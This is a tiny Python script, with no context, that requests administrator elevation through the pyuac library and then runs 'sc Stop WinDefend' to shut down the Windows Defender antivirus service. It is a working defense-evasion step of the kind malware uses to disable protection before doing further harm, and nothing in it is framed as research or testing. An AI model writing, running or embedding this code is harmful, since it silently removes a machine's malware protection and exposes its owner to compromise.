import os

import pyuac

if not pyuac.isUserAdmin():
    pyuac.runAsAdmin()

os.system("sc Stop WinDefend")




